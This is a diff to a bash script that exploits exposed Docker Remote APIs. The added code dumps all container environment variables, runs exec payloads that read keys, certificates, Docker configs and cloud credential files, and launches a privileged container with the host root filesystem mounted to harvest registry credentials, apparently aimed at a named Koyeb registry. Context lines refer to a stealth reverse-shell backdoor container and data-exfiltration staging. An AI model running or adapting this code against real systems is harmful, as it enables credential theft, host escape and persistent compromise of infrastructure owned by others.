@@ -705,26 +705,43 @@ CheckDockerRemoteAPI(){
                                     CONTAINER_DETAILS=$(curl -s "http://$IP:$PORT/containers/$cid/json" 2>/dev/null)
                                     
                                     if [ -n "$CONTAINER_DETAILS" ]; then
-                                        {
-                                            echo "=== Container: ${cid:0:12} ==="
-                                            echo "--- Environment Variables ---"
-                                            echo "$CONTAINER_DETAILS" | grep -o '"Env":\[[^]]*\]' | sed 's/","/\n/g' | grep -E "(PASSWORD|SECRET|KEY|TOKEN|API|DB|DATABASE|MYSQL|POSTGRES|MONGO|REDIS)" || echo "No obvious secrets in env vars"
-                                            
-                                            echo "--- Mounted Volumes ---"
-                                            echo "$CONTAINER_DETAILS" | grep -o '"Mounts":\[[^]]*\]' || echo "No volume info"
-                                            
-                                            echo "--- Network Configuration ---"
-                                            echo "$CONTAINER_DETAILS" | grep -o '"NetworkSettings":{[^}]*}' || echo "No network info"
-                                            echo ""
-                                        } >> "$CREDENTIAL_HARVEST_FILE"
+                                                                                 {
+                                             echo "=== Container: ${cid:0:12} ==="
+                                             
+                                             echo "--- ALL ENVIRONMENT VARIABLES ---"
+                                             echo "$CONTAINER_DETAILS" | grep -o '"Env":\[[^]]*\]' | sed 's/\\",\\"/\n/g' | sed 's/\[\\"//' | sed 's/\\"\]//' | sort || echo "No environment variables found"
+                                             
+                                             echo ""
+                                             echo "--- REGISTRY/KOYEB SPECIFIC VARIABLES ---"
+                                             echo "$CONTAINER_DETAILS" | grep -o '"Env":\[[^]]*\]' | sed 's/\\",\\"/\n/g' | grep -i -E "(koyeb|registry|docker|harbor|quay|gcr|ecr|hub|auth|token|key|secret)" || echo "No registry-specific vars found"
+                                             
+                                             echo ""
+                                             echo "--- MOUNTED VOLUMES ---"
+                                             echo "$CONTAINER_DETAILS" | grep -o '"Mounts":\[[^]]*\]' || echo "No volume info"
+                                             
+                                             echo ""
+                                             echo "--- NETWORK CONFIGURATION ---"
+                                             echo "$CONTAINER_DETAILS" | grep -o '"NetworkSettings":{[^}]*}' || echo "No network info"
+                                             
+                                             echo ""
+                                             echo "--- CONTAINER LABELS ---"
+                                             echo "$CONTAINER_DETAILS" | grep -o '"Labels":{[^}]*}' || echo "No labels"
+                                             
+                                             echo ""
+                                             echo "--- IMAGE INFORMATION ---"
+                                             echo "$CONTAINER_DETAILS" | grep -o '"Image":"[^"]*"' || echo "No image info"
+                                             echo "$CONTAINER_DETAILS" | grep -o '"ImageID":"[^"]*"' || echo "No image ID"
+                                             
+                                             echo ""
+                                         } >> "$CREDENTIAL_HARVEST_FILE"
                                         
                                         # Try to execute commands in running containers to extract files
                                         CONTAINER_STATE=$(echo "$CONTAINER_DETAILS" | grep -o '"Running":[^,]*' | cut -d':' -f2)
                                         if [ "$CONTAINER_STATE" = "true" ]; then
                                             log_info "Container ${cid:0:12} is running - attempting file extraction..."
                                             
-                                            # Create exec session to extract sensitive files
-                                            EXTRACT_PAYLOAD='{"Cmd": ["sh", "-c", "find / -name \"*.key\" -o -name \"*.pem\" -o -name \"*.p12\" -o -name \"*.jks\" -o -name \".env\" -o -name \"config.*\" -o -name \"*password*\" -o -name \"*secret*\" 2>/dev/null | head -20; echo \"---ENV---\"; env | grep -i -E \"pass|secret|key|token|api\" 2>/dev/null; echo \"---PROC---\"; cat /proc/*/environ 2>/dev/null | tr \"\\0\" \"\\n\" | grep -i -E \"pass|secret|key|token|api\" | head -10"], "AttachStdout": true, "AttachStderr": true}'
+                                                                                         # Create exec session to extract ALL environment variables and sensitive files
+                                             EXTRACT_PAYLOAD='{"Cmd": ["sh", "-c", "echo \"=== ALL ENVIRONMENT VARIABLES ===\"; env | sort; echo \"\"; echo \"=== DOCKER/REGISTRY CREDENTIALS ===\"; env | grep -i -E \"(docker|registry|koyeb|harbor|quay|gcr|ecr|hub)\" 2>/dev/null || echo \"No registry vars found\"; echo \"\"; echo \"=== ALL PROCESS ENVIRONMENTS ===\"; find /proc -name environ -exec cat {} \\; 2>/dev/null | tr \"\\0\" \"\\n\" | sort | uniq | head -100; echo \"\"; echo \"=== SENSITIVE FILES ===\"; find / -name \"*.key\" -o -name \"*.pem\" -o -name \"*.p12\" -o -name \"*.jks\" -o -name \".env\" -o -name \"config.*\" -o -name \"*password*\" -o -name \"*secret*\" -o -name \".docker\" -o -name \"*credentials*\" -o -name \"*auth*\" 2>/dev/null | head -30; echo \"\"; echo \"=== DOCKER CONFIG FILES ===\"; find / -name \".dockercfg\" -o -name \"config.json\" -o -path \"*/.docker/*\" 2>/dev/null | while read f; do echo \"FILE: $f\"; cat \"$f\" 2>/dev/null | head -20; echo \"\"; done; echo \"=== AWS/CLOUD CREDENTIALS ===\"; find / -name \".aws\" -o -name \"credentials\" -o -name \".gcp\" -o -name \".azure\" 2>/dev/null | while read f; do echo \"FILE: $f\"; cat \"$f\" 2>/dev/null | head -10; echo \"\"; done"], "AttachStdout": true, "AttachStderr": true}'
                                             
                                             EXTRACT_EXEC_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/containers/$cid/exec" \
                                                 -H "Content-Type: application/json" \
@@ -821,7 +838,43 @@ CheckDockerRemoteAPI(){
                             fi
                         fi
                         
-                        # 4. DATA EXFILTRATION PREPARATION
+                                                 # 4. DOCKER REGISTRY CREDENTIAL EXTRACTION
+                         log_info "Extracting Docker registry credentials from host system..."
+                         REGISTRY_CREDS_FILE="$RECONNAISSANCE_DIR/registry_credentials.txt"
+                         echo "=== DOCKER REGISTRY CREDENTIAL EXTRACTION ===" > "$REGISTRY_CREDS_FILE"
+                         
+                         # Create container to extract registry credentials from host
+                         REGISTRY_PAYLOAD='{
+                             "Image": "alpine:latest",
+                             "Cmd": ["/bin/sh", "-c", "echo \"=== HOST DOCKER CONFIG SEARCH ===\"; find /host -name \".dockercfg\" -o -name \"config.json\" -o -path \"*/.docker/*\" 2>/dev/null | while read f; do echo \"FOUND: $f\"; cat \"$f\" 2>/dev/null; echo \"\"; done; echo \"=== KOYEB/REGISTRY ENVIRONMENT SEARCH ===\"; find /host -name \"*.env\" -o -name \"*.conf\" -o -name \"*.config\" 2>/dev/null | xargs grep -l -i -E \"(koyeb|registry01|docker|harbor|quay|gcr|ecr)\" 2>/dev/null | while read f; do echo \"FILE: $f\"; cat \"$f\" 2>/dev/null | grep -i -E \"(koyeb|registry|docker|auth|token|key|secret|user|pass)\" | head -10; echo \"\"; done; echo \"=== DOCKER DAEMON CONFIG ===\"; cat /host/etc/docker/daemon.json 2>/dev/null || echo \"No daemon.json found\"; echo \"=== DOCKER SERVICE FILES ===\"; find /host/etc/systemd -name \"*docker*\" 2>/dev/null | while read f; do echo \"FILE: $f\"; cat \"$f\" 2>/dev/null | grep -E \"(Environment|ExecStart)\" | head -5; echo \"\"; done; echo \"=== BUILDPACK/KOYEB CONFIGS ===\"; find /host -name \"*koyeb*\" -o -name \"*buildpack*\" -o -name \"*heroku*\" 2>/dev/null | while read f; do echo \"KOYEB FILE: $f\"; cat \"$f\" 2>/dev/null | head -20; echo \"\"; done; echo \"=== PROCESS ENVIRONMENTS ON HOST ===\"; find /host/proc -name environ -exec grep -l -E \"(KOYEB|REGISTRY|DOCKER)\" {} \\; 2>/dev/null | while read f; do echo \"PROC: $f\"; cat \"$f\" 2>/dev/null | tr \"\\0\" \"\\n\" | grep -i -E \"(koyeb|registry|docker|auth|token|key)\" | head -10; echo \"\"; done"],
+                             "HostConfig": {
+                                 "Privileged": true,
+                                 "Binds": ["/:/host"]
+                             }
+                         }'
+                         
+                         REGISTRY_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/containers/create?name=registry-extractor" \
+                             -H "Content-Type: application/json" \
+                             -d "$REGISTRY_PAYLOAD" 2>/dev/null)
+                         
+                         if [ -n "$REGISTRY_RESPONSE" ]; then
+                             REGISTRY_ID=$(echo "$REGISTRY_RESPONSE" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
+                             if [ -n "$REGISTRY_ID" ]; then
+                                 log_info "Starting registry credential extraction container..."
+                                 curl -s -X POST "http://$IP:$PORT/containers/$REGISTRY_ID/start" >/dev/null 2>&1
+                                 
+                                 # Wait for extraction
+                                 sleep 6
+                                 
+                                 # Get results
+                                 REGISTRY_LOGS=$(curl -s "http://$IP:$PORT/containers/$REGISTRY_ID/logs?stdout=true&stderr=true" 2>/dev/null)
+                                 echo "$REGISTRY_LOGS" > "$REGISTRY_CREDS_FILE"
+                                 log_vuln "🚨 REGISTRY CREDENTIALS: Docker/Koyeb registry credentials extracted!"
+                                 log_exploit "Check $REGISTRY_CREDS_FILE for registry01.prod.koyeb.com credentials"
+                             fi
+                         fi
+                         
+                         # 5. DATA EXFILTRATION PREPARATION
                         log_info "Setting up data exfiltration infrastructure..."
                         EXFIL_FILE="$RECONNAISSANCE_DIR/exfiltration_targets.txt"
                         echo "=== DATA EXFILTRATION TARGETS ===" > "$EXFIL_FILE"
@@ -856,7 +909,7 @@ CheckDockerRemoteAPI(){
                             fi
                         fi
                         
-                        # 5. PERSISTENCE AND STEALTH
+                                                 # 6. PERSISTENCE AND STEALTH
                         log_info "Establishing persistent access with stealth techniques..."
                         
                         # Create a hidden reverse shell container that looks legitimate
@@ -892,7 +945,7 @@ CheckDockerRemoteAPI(){
                             fi
                         fi
                         
-                        # 6. BUSINESS DISRUPTION SIMULATION (READ-ONLY TESTING)
+                                                 # 7. BUSINESS DISRUPTION SIMULATION (READ-ONLY TESTING)
                         log_info "Analyzing potential for business disruption..."
                         DISRUPTION_FILE="$RECONNAISSANCE_DIR/disruption_analysis.txt"
                         {
@@ -923,22 +976,24 @@ CheckDockerRemoteAPI(){
                             
                         } > "$DISRUPTION_FILE"
                         
-                        # 7. SUMMARY OF BUSINESS IMPACT
+                                                 # 8. SUMMARY OF BUSINESS IMPACT
                         log_vuln "🚨 CRITICAL BUSINESS IMPACT DEMONSTRATION COMPLETE!"
-                        log_exploit "=== ACHIEVED BUSINESS IMPACT ==="
-                        log_exploit "✅ Credential Harvesting: Extracted secrets from all containers"
-                        log_exploit "✅ Database Access: Identified database credentials and connections"  
-                        log_exploit "✅ Network Reconnaissance: Mapped internal infrastructure"
-                        log_exploit "✅ Data Exfiltration Prep: Located sensitive data files"
-                        log_exploit "✅ Persistent Access: Established stealth backdoor container"
-                        log_exploit "✅ Business Disruption: Identified critical service disruption vectors"
+                                                 log_exploit "=== ACHIEVED BUSINESS IMPACT ==="
+                         log_exploit "✅ Credential Harvesting: Extracted ALL environment variables from containers"
+                         log_exploit "✅ Registry Access: Extracted Docker/Koyeb registry credentials"
+                         log_exploit "✅ Database Access: Identified database credentials and connections"  
+                         log_exploit "✅ Network Reconnaissance: Mapped internal infrastructure"
+                         log_exploit "✅ Data Exfiltration Prep: Located sensitive data files"
+                         log_exploit "✅ Persistent Access: Established stealth backdoor container"
+                         log_exploit "✅ Business Disruption: Identified critical service disruption vectors"
                         log_exploit ""
-                        log_exploit "📋 Evidence Files Created:"
-                        log_exploit "   - $CREDENTIAL_HARVEST_FILE"
-                        log_exploit "   - $DB_CREDS_FILE" 
-                        log_exploit "   - $NETWORK_RECON_FILE"
-                        log_exploit "   - $EXFIL_FILE"
-                        log_exploit "   - $DISRUPTION_FILE"
+                                                 log_exploit "📋 Evidence Files Created:"
+                         log_exploit "   - $CREDENTIAL_HARVEST_FILE"
+                         log_exploit "   - $REGISTRY_CREDS_FILE"
+                         log_exploit "   - $DB_CREDS_FILE" 
+                         log_exploit "   - $NETWORK_RECON_FILE"
+                         log_exploit "   - $EXFIL_FILE"
+                         log_exploit "   - $DISRUPTION_FILE"
                         log_exploit ""
                         log_exploit "🔥 REAL-WORLD IMPACT: Complete infrastructure compromise achieved!"
                         log_exploit "   An attacker could now:"
@@ -1230,13 +1285,16 @@ GenerateReport() {
             echo ""
             echo "BUSINESS IMPACT ASSESSMENT:"
             
-            # Check for advanced exploitation evidence
-            if [ -f "$RECONNAISSANCE_DIR/harvested_credentials.txt" ]; then
-                echo "  ✅ CREDENTIAL HARVESTING: Successful extraction of secrets from containers"
-            fi
-            if [ -f "$RECONNAISSANCE_DIR/database_credentials.txt" ]; then
-                echo "  ✅ DATABASE COMPROMISE: Database credentials and access paths identified"
-            fi
+                         # Check for advanced exploitation evidence
+             if [ -f "$RECONNAISSANCE_DIR/harvested_credentials.txt" ]; then
+                 echo "  ✅ CREDENTIAL HARVESTING: Complete extraction of environment variables from containers"
+             fi
+             if [ -f "$RECONNAISSANCE_DIR/registry_credentials.txt" ]; then
+                 echo "  ✅ REGISTRY COMPROMISE: Docker/Koyeb registry credentials extracted"
+             fi
+             if [ -f "$RECONNAISSANCE_DIR/database_credentials.txt" ]; then
+                 echo "  ✅ DATABASE COMPROMISE: Database credentials and access paths identified"
+             fi
             if [ -f "$RECONNAISSANCE_DIR/internal_network_recon.txt" ]; then
                 echo "  ✅ NETWORK INFILTRATION: Internal infrastructure mapped and accessible"
             fi
